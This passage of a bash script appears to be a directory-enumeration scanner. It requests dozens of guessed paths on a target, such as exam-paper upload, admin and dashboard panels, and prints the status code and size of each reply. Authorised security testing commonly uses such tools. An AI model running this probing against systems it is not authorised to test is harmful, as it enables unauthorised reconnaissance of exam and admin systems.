         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

